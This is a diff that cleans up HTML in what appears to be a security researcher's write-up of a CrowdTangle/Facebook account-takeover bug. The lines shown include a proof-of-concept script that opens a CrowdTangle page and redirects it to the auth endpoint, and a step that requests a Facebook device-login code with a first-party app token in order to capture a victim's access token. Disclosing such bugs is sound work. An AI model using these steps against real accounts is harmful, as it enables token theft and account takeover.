@@ -72,7 +72,7 @@
 &lt;body&gt;
 &lt;script&gt;
 cli = function(){
-opn = window.open("&lt;strong&gt;https://apps.crowdtangle.com/CUSTOM_PAGE/e/x/x/HASH/&lt;/strong&gt;");
+opn = window.open("https://apps.crowdtangle.com/CUSTOM_PAGE/e/x/x/HASH/&lt;/strong&gt;");
 setTimeout(function(){
 
 opn.location.href = "https://apps.crowdtangle.com/auth/server";
@@ -103,14 +103,7 @@ What we can do here is to use the previous limited access_token gathered to make
 
 <ol>
   <li>
-    <table>
-      <tbody>
-        <tr>
-          <td>Send a POST request to <strong>https://graph.facebook.com/v2.6/device/login</strong> with these parameters “**scope=public_profile&amp;access_token=437340816620806</td>
-          <td>04a36c2558cde98e185d7f4f701e4d94**” ( Notice the access_token of the victim wasn’t used but here we’re creating a device code to authorize the application 437340816620806 which is a first party application that allows device logins).</td>
-        </tr>
-      </tbody>
-    </table>
+    <p>Send a POST request to https://graph.facebook.com/v2.6/device/login with these parameters “scope=public_profile&amp;access_token=437340816620806|04a36c2558cde98e185d7f4f701e4d94” ( Notice the access_token of the victim wasn’t used but here we’re creating a device code to authorize the application 437340816620806 which is a first party application that allows device logins).</p>
 
     <p>We’ll note the “user_code”, as <strong>USER_CODE</strong> and the “code” to retrieve the victim access_token later as “<strong>RETRIEVE_CODE</strong>“</p>
   </li>
